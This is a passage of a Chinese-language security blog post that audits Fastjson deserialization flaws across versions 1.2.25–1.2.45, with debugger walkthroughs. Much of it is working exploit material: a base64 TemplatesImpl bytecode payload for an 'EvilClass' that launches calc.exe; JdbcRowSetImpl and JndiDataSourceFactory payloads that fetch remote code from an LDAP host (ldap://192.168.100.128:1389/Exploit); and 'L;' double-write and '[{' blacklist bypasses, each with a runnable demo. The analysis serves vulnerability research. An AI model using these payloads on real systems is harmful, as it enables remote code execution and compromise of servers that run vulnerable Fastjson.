class="hljs-string">&quot;yv66vgAAADQAJwoACAAXCgAYABkIABoKABgAGwcAHAoABQAdBwAeBwAfAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHACABAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwAcAQAKU291cmNlRmlsZQEADkV2aWxDbGFzcy5qYXZhDAAJAAoHACEMACIAIwEACGNhbGMuZXhlDAAkACUBABNqYXZhL2lvL0lPRXhjZXB0aW9uDAAmAAoBABVvcmcvZXhhbXBsZS9FdmlsQ2xhc3MBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAABAABAAkACgABAAsAAAAdAAEAAQAAAAUqtwABsQAAAAEADAAAAAYAAQAAAAsAAQANAA4AAgALAAAAGQAAAAMAAAABsQAAAAEADAAAAAYAAQAAABAADwAAAAQAAQAQAAEADQARAAIACwAAABkAAAAEAAAAAbEAAAABAAwAAAAGAAEAAAAVAA8AAAAEAAEAEAAIABIACgABAAsAAABPAAIAAQAAABK4AAISA7YABFenAAhLKrYABrEAAQAAAAkADAAFAAIADAAAABYABQAAABkACQAcAAwAGgANABsAEQAeABMAAAAHAAJMBwAUBAABABUAAAACABY=&quot;</span>;<br><br>      <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">NASTY_CLASS</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Lcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;&quot;</span>;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS +<br>                <span class="hljs-string">&quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span> + byteCode + <span class="hljs-string">&quot;\&quot;],&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;_name\&quot;:\&quot;EvilClass\&quot;,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;_tfactory\&quot;:&#123;&#125;,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;_outputProperties\&quot;:&#123;&#125;&#125;&quot;</span>;<br><br>        System.out.println(payload);<br><br>        <span class="hljs-comment">// 反序列化</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> JSON.parseObject(payload, Object.class, Feature.SupportNonPublicField);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1745853801825-b52a5a4d-9455-442a-a729-849dbcaaa5c9.png"></p><p>另一种payload，<code>[</code>绕过<code>checkautotype</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;[com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>[&#123;,<span class="hljs-string">&quot;_bytecodes&quot;</span>:[<span class="hljs-string">&quot;yv66vgAAADQAJwoACAAXCgAYABkIABoKABgAGwcAHAoABQAdBwAeBwAfAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHACABAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwAcAQAKU291cmNlRmlsZQEADkV2aWxDbGFzcy5qYXZhDAAJAAoHACEMACIAIwEACGNhbGMuZXhlDAAkACUBABNqYXZhL2lvL0lPRXhjZXB0aW9uDAAmAAoBABVvcmcvZXhhbXBsZS9FdmlsQ2xhc3MBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAABAABAAkACgABAAsAAAAdAAEAAQAAAAUqtwABsQAAAAEADAAAAAYAAQAAAAsAAQANAA4AAgALAAAAGQAAAAMAAAABsQAAAAEADAAAAAYAAQAAABAADwAAAAQAAQAQAAEADQARAAIACwAAABkAAAAEAAAAAbEAAAABAAwAAAAGAAEAAAAVAA8AAAAEAAEAEAAIABIACgABAAsAAABPAAIAAQAAABK4AAISA7YABFenAAhLKrYABrEAAQAAAAkADAAFAAIADAAAABYABQAAABkACQAcAAwAGgANABsAEQAeABMAAAAHAAJMBwAUBAABABUAAAACABY=&quot;</span>],<span class="hljs-string">&quot;_name&quot;</span>:<span class="hljs-string">&quot;EvilClass&quot;</span>,<span class="hljs-string">&quot;_tfactory&quot;</span>:&#123;&#125;,<span class="hljs-string">&quot;_outputProperties&quot;</span>:&#123;&#125;&#125;<br><br></code></pre></td></tr></table></figure><h3 id="JndiDataSourceFactory"><a href="#JndiDataSourceFactory" class="headerlink" title="JndiDataSourceFactory"></a>JndiDataSourceFactory</h3><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1745854443538-64e78acc-c779-41f1-8c88-f9e03ec55ed2.png"></p><p>payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;  <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;Lorg.apache.ibatis.datasource.jndi.JndiDataSourceFactory;&quot;</span>,  <span class="hljs-string">&quot;properties&quot;</span>: &#123;    <span class="hljs-string">&quot;data_source&quot;</span>: <span class="hljs-string">&quot;ldap://192.168.100.128:1389/Exploit&quot;</span>  &#125;&#125;<br></code></pre></td></tr></table></figure><p>demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JndiDataSourceFactory</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>); <span class="hljs-comment">//开启autotype</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;  \&quot;@type\&quot;: \&quot;Lorg.apache.ibatis.datasource.jndi.JndiDataSourceFactory;\&quot;,&quot;</span> +<br>                <span class="hljs-string">&quot;  \&quot;properties\&quot;: &#123;&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;data_source\&quot;: \&quot;ldap://192.168.100.128:1389/Exploit\&quot;&quot;</span> +<br>                <span class="hljs-string">&quot;  &#125;&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        System.out.println(payload);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> JSON.parse(payload);    <span class="hljs-comment">// 将 JSON 格式的字符串解析（反序列化）为 Java 对象</span><br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1745854400793-7ff733bc-5f66-47c5-b7e3-b942a2277d18.png"></p><p>另一种payload，<code>[</code>绕过</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;  <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;[org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;</span>[&#123;,  <span class="hljs-string">&quot;properties&quot;</span>: &#123;    <span class="hljs-string">&quot;data_source&quot;</span>: <span class="hljs-string">&quot;ldap://192.168.100.128:1389/Exploit&quot;</span>  &#125;&#125;<br></code></pre></td></tr></table></figure><h2 id="审计-2"><a href="#审计-2" class="headerlink" title="审计"></a>审计</h2><p>下断点一路跟进到<code>D:\maven_repo\com\alibaba\fastjson\1.2.41\fastjson-1.2.41.jar!\com\alibaba\fastjson\parser\ParserConfig.class：791</code>的<code>checkAutoType()</code>方法</p><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1745905669725-ab9b3dd4-4705-4670-8ad4-ee53851b1589.png"></p><p><code>acceptList</code>为白名单（默认为空）</p><p>然后看黑名单</p><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1745854910811-b3069bae-8562-4660-9a92-da045a948559.png"></p><p>这里要复制整个<code>list</code>的话，<code>alt+f8</code></p><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1745855399529-4a4f8a3c-ce72-4844-8735-1d43a4d810c8.png"></p><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1745855463396-69db6efd-3fa2-480c-bdc1-b86786fb458c.png"></p><p>黑名单有23个</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">[<span class="hljs-string">&quot;bsh&quot;</span>,<span class="hljs-string">&quot;com.mchange&quot;</span>,<span class="hljs-string">&quot;com.sun.&quot;</span>,<span class="hljs-string">&quot;java.lang.Thread&quot;</span>,<span class="hljs-string">&quot;java.net.Socket&quot;</span>,<span class="hljs-string">&quot;java.rmi&quot;</span>,<span class="hljs-string">&quot;javax.xml&quot;</span>,<span class="hljs-string">&quot;org.apache.bcel&quot;</span>,<span class="hljs-string">&quot;org.apache.commons.beanutils&quot;</span>,<span class="hljs-string">&quot;org.apache.commons.collections.Transformer&quot;</span>,<span class="hljs-string">&quot;org.apache.commons.collections.functors&quot;</span>,<span class="hljs-string">&quot;org.apache.commons.collections4.comparators&quot;</span>,<span class="hljs-string">&quot;org.apache.commons.fileupload&quot;</span>,<span class="hljs-string">&quot;org.apache.myfaces.context.servlet&quot;</span>,<span class="hljs-string">&quot;org.apache.tomcat&quot;</span>,<span class="hljs-string">&quot;org.apache.wicket.util&quot;</span>,<span class="hljs-string">&quot;org.apache.xalan&quot;</span>,<span class="hljs-string">&quot;org.codehaus.groovy.runtime&quot;</span>,<span class="hljs-string">&quot;org.hibernate&quot;</span>,<span class="hljs-string">&quot;org.jboss&quot;</span>,<span class="hljs-string">&quot;org.mozilla.javascript&quot;</span>,<span class="hljs-string">&quot;org.python.core&quot;</span>,<span class="hljs-string">&quot;org.springframework&quot;</span>]<br></code></pre></td></tr></table></figure><p>而在<code>fastjson 1.2.24</code>只有两个</p><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1745678550219-35904b5a-d7f3-4138-91fb-e378d9d2de79.png"></p><p>这里前面加了个<code>L</code>自然所有黑名单都不管用了</p><p>监视<code>@type</code>的值的变化</p><p>到<code>D:\maven_repo\com\alibaba\fastjson\1.2.41\fastjson-1.2.41.jar!\com\alibaba\fastjson\util\TypeUtils.class：1044</code></p><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1745856116131-b8795398-87f1-49b5-a26e-d42057aea9e9.png"></p><p>如果<code>L</code>开头<code>;</code>结尾就去除头尾再调用一次<code>loadClass</code>然后后续的流程，前面其实还有一个对<code>[</code>开头的判断，其实用<code>[</code>开头也可以绕过</p><p>这里<code>L</code>开头<code>;</code>结尾是<code>JNI</code>(Java Native Interface FieldDescriptors) 字段描述符</p><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1745905293079-dc4a322c-f4ca-4416-9f2a-a085b115708a.png"></p><p><code>[</code>开头绕过的payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span>[&#123;,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://192.168.100.128:1389/Exploit&quot;</span>,<span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;<br></code></pre></td></tr></table></figure><p>为什么要在第一个键值对后面加<code>[&#123;</code></p><p>删掉跑一下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://192.168.100.128:1389/Exploit&quot;</span>,<span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;<br></code></pre></td></tr></table></figure><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1745941763983-04129bef-3409-4291-ab3d-bcf4a7600a60.png"></p><p>说是希望在下标42的地方接收<code>[</code>,42是第一个键值对后面的<code>,</code></p><p>点击<code>com.alibaba.fastjson.parser.DefaultJSONParser.parseArray(DefaultJSONParser.java:672)</code></p><p>可以进到抛出异常的地方</p><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1745942177008-5650a87e-3b4a-4b9b-bce4-a15fc2863121.png"></p><p>加上<code>[</code>再跑一下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span>[,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://192.168.100.128:1389/Exploit&quot;</span>,<span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;<br></code></pre></td></tr></table></figure><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1745942278075-3b420e37-c537-4564-a65f-7f78a4991c2d.png"></p><p>说是希望在下标43接收<code>&#123;</code>进入抛出异常的地方</p><p><code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:451)</code></p><p>如果满足<code>if (token != 12 &amp;&amp; token != 16) </code>就会抛出异常</p><p><code>token</code>在<code>D:\maven_repo\com\alibaba\fastjson\1.2.41\fastjson-1.2.41.jar!\com\alibaba\fastjson\parser\JSONLexerBase.class</code></p><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1745943466752-9e1e18cb-9ffc-4c65-a5eb-7f3f2cc7ef64.png"></p><p>满足这两个，不抛出异常后续就能正常反序列化了</p><p><code>[&#123;</code> 的作用：</p><pre><code class="hljs">- `[` 表示 JSON 数组的开始。- `&#123;` 表示 JSON 对象的开始，用于传入 `dbcRowSetImpl` 的属性（如 `dataSourceName`）。- 这种格式让 Fastjson 认为这是一个合法的 JSON 数组结构，从而正确解析 payload。</code></pre><p>下个版本会在<code>checkAutoType</code>先去除<code>@type</code>开头的<code>L</code>和末尾的<code>;</code>然后才进入<code>loadClass</code></p><p>所以可以双写绕过</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;</span>,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://192.168.100.128:1389/Exploit&quot;</span>,<span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;<br></code></pre></td></tr></table></figure><p>这个方法其实在当前版本范围<code>1.2.25-1.2.41</code>也可以用</p><p>因为在<code>com.alibaba.fastjson.util.TypeUtils#loadClass</code></p><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1746449589065-739dd9f4-99d3-44ea-8fc7-6cb80622b21e.png"></p><p>去除头尾再递归调用<code>loadClass</code>，无论有几个<code>L</code>，都能被处理最后只剩下<code>com.sun.rowset.JdbcRowSetImpl</code></p><h1 id="FastJson-1-2-42"><a href="#FastJson-1-2-42" class="headerlink" title="FastJson 1.2.42"></a>FastJson 1.2.42</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;dependency&gt;<br>    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;<br>    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;<br>    &lt;version&gt;<span class="hljs-number">1.2</span><span class="hljs-number">.42</span>&lt;/version&gt;<br>&lt;/dependency&gt;<br></code></pre></td></tr></table></figure><p>需要<code>ParserConfig.getGlobalInstance().setAutoTypeSupport(true); //开启autotype</code></p><p>在<code>checkAutoType</code>先去除<code>@type</code>开头的<code>L</code>和末尾的<code>;</code></p><p>黑名单改为了哈希黑名单，防止对黑名单进行分析绕过</p><p>一些已破解的黑名单白名单<a href="https://github.com/LeadroyaL/fastjson-blacklist">https://github.com/LeadroyaL/fastjson-blacklist</a></p><h2 id="审计-3"><a href="#审计-3" class="headerlink" title="审计"></a>审计</h2><p>demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FastJsonTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>); <span class="hljs-comment">//开启autotype</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;LLcom.sun.rowset.JdbcRowSetImpl;;\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://192.168.100.128:1389/Exploit\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;</span>;<br>        System.out.println(payload);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> JSON.parse(payload);    <span class="hljs-comment">// 将 JSON 格式的字符串解析（反序列化）为 Java 对象</span><br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在<code>com.alibaba.fastjson.parser.ParserConfig#checkAutoType(java.lang.String, java.lang.Class&lt;?&gt;, int)</code></p><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1746450755955-980f4927-be78-4f8c-9a84-e5606dc57a8c.png"></p><p>去除头尾的<code>L;</code></p><p>黑名单不再是硬编码类名了，用的<code>hash</code></p><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1746450908419-fae33a6a-e249-4312-a4c9-b8954b712f3d.png"></p><p>很显然通双写的方法，可以绕过黑名单，黑名单肯定是<code>com.sun.rowset.JdbcRowSetImpl</code>而<code>Lcom.sun.rowset.JdbcRowSetImpl</code>，不在黑名单中</p><p>无论写多少个<code>L</code>（大于2）都可以绕过,因为<code>loadClass</code>会递归处理<code>@type</code></p><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1746451997603-42b53af8-1df7-4972-96fc-24877ba29ee7.png"></p><p>此外，这个版本并没有对<code>[</code>开头的进行处理，所以这个payload依然如入无人之境</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span>[&#123;,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://192.168.100.128:1389/Exploit&quot;</span>,<span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;<br></code></pre></td></tr></table></figure><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1746452340853-fe3379e6-23b2-4404-a27b-33a29ca6d2be.png"></p><h1 id="FastJson-1-2-43"><a href="#FastJson-1-2-43" class="headerlink" title="FastJson 1.2.43"></a>FastJson 1.2.43</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;dependency&gt;<br>    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;<br>    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;<br>    &lt;version&gt;<span class="hljs-number">1.2</span><span class="hljs-number">.43</span>&lt;/version&gt;<br>&lt;/dependency&gt;<br></code></pre></td></tr></table></figure><p>需要<code>ParserConfig.getGlobalInstance().setAutoTypeSupport(true); //开启autotype</code></p><p><code>checkAutoType</code>禁止了双写绕过</p><h2 id="审计-4"><a href="#审计-4" class="headerlink" title="审计"></a>审计</h2><p>在<code>com.alibaba.fastjson.parser.ParserConfig#checkAutoType(java.lang.String, java.lang.Class&lt;?&gt;, int)</code></p><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1746452930472-eef21828-f7fa-4b0d-86a7-769d14f22a6f.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (((-<span class="hljs-number">3750763034362895579L</span> ^ (<span class="hljs-type">long</span>)className.charAt(<span class="hljs-number">0</span>)) * <span class="hljs-number">1099511628211L</span> ^ (<span class="hljs-type">long</span>)className.charAt(className.length() - <span class="hljs-number">1</span>)) * <span class="hljs-number">1099511628211L</span> == <span class="hljs-number">655701488918567152L</span>) &#123;<br>    <span class="hljs-keyword">if</span> (((-<span class="hljs-number">3750763034362895579L</span> ^ (<span class="hljs-type">long</span>)className.charAt(<span class="hljs-number">0</span>)) * <span class="hljs-number">1099511628211L</span> ^ (<span class="hljs-type">long</span>)className.charAt(<span class="hljs-number">1</span>)) * <span class="hljs-number">1099511628211L</span> == <span class="hljs-number">655656408941810501L</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>    &#125;<br><br>    className = className.substring(<span class="hljs-number">1</span>, className.length() - <span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>多少个<code>L</code>都没用</p><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1746452662219-5f5dfb07-5efd-473d-9697-28c1b755232c.png"></p><p>因为只要<code>L</code>开头<code>;</code>结尾就会抛出异常</p><p>此外，这个版本依然没有对<code>[</code>开头的进行处理，所以这个payload依然如入无人之境</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span>[&#123;,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://192.168.100.128:1389/Exploit&quot;</span>,<span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;<br></code></pre></td></tr></table></figure><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1746452606225-23a8e3b7-f96c-4305-b0fd-f7f7bca4f42c.png"></p><h1 id="FastJson-1-2-44-1-2-45"><a href="#FastJson-1-2-44-1-2-45" class="headerlink" title="FastJson 1.2.44 - 1.2.45"></a>FastJson 1.2.44 - 1.2.45</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;dependency&gt;<br>    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;<br>    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;<br>    &lt;version&gt;<span class="hljs-number">1.2</span><span class="hljs-number">.44</span>&lt;/version&gt;<br>&lt;/dependency&gt;<br><br>&lt;dependency&gt;<br>    &lt;groupId&gt;org.mybatis&lt;/groupId&gt;<br>    &lt;artifactId&gt;mybatis&lt;/artifactId&gt;<br>    &lt;version&gt;<span class="hljs-number">3.5</span><span class="hljs-number">.7</span>&lt;/version&gt;<br>&lt;/dependency&gt;<br><br></code></pre></td></tr></table></figure><p>需要<code>ParserConfig.getGlobalInstance().setAutoTypeSupport(true); </code>开启autoTyoe；需要目标服务端存在<code>mybatis</code>的jar包，且版本需为<code>3.x.x-3.5.0</code>的版本</p><h2 id="审计-5"><a href="#审计-5" class="headerlink" title="审计"></a>审计</h2><p><code>com.alibaba.fastjson.parser.ParserConfig#checkAutoType(java.lang.String, java.lang.Class&lt;?&gt;, int)</code></p><p><code>@type</code>第一个字符是<code>[</code>就抛出异常</p><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1746453373584-f795ff94-bfa5-41f2-a411-6df3f6485d5e.png"></p><p>只能绕过黑名单用<code>JndiDataSourceFactory</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 